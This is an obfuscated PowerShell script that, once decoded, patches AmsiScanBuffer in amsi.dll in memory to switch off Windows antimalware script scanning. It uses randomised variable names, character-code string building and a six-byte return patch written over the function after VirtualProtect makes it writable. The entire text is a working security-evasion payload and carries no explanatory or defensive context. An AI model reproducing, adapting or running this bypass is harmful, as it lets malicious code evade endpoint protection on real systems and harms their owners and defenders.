$v1vOfosU = @"
using System;
using System.Runtime.InteropServices;
public class v1vOfosU {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr CSTQpSjgx_dE, string K2vppXyanwmKyERmn);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr Z_JgTEOv88k, UIntPtr AVvfv6luA, uint mEnyhtyidjm, out uint uwjSEz);
}
"@

Add-Type $v1vOfosU

$nlw4Nr5t3d3b0 = [v1vOfosU]::LoadLibrary("$([cHar](91+6)+[cHar]([bYtE]0x6d)+[chAR](115+14-14)+[cHar](86+19)+[chaR](46)+[ChaR]([BYte]0x64)+[CHAr](108*98/98)+[cHar]([byte]0x6c))")
$jI7MLwZbXBcQELc5Q = [v1vOfosU]::GetProcAddress($nlw4Nr5t3d3b0, "$(('ÂmsíSc'+'ânBûff'+'ér').normAlIZe([char](17+53)+[cHar]([bYTe]0x6f)+[ChaR](114*35/35)+[CHAR](109*30/30)+[cHAR]([bYTe]0x44)) -replace [cHar](92*51/51)+[cHAR](112+39-39)+[ChAR](123+114-114)+[cHaR](5+72)+[chaR](46+64)+[CHAR](98+27))")
$p = 0
[v1vOfosU]::VirtualProtect($jI7MLwZbXBcQELc5Q, [uint32]5, 0x40, [ref]$p)
$Qo6u9Eury6iE_diZZpY = "0xB8"
$P3DGIy7R3oq3rH = "0x57"
$RUUxzda3 = "0x00"
$XaFC2lqMsDLSAPPkuKHB = "0x07"
$LXEQycIiD = "0x80"
$OiqIYpWSHlIVTDHQNN = "0xC3"
$yMfeObR = [Byte[]] ($Qo6u9Eury6iE_diZZpY,$P3DGIy7R3oq3rH,$RUUxzda3,$XaFC2lqMsDLSAPPkuKHB,+$LXEQycIiD,+$OiqIYpWSHlIVTDHQNN)
[System.Runtime.InteropServices.Marshal]::Copy($yMfeObR, 0, $jI7MLwZbXBcQELc5Q, 6)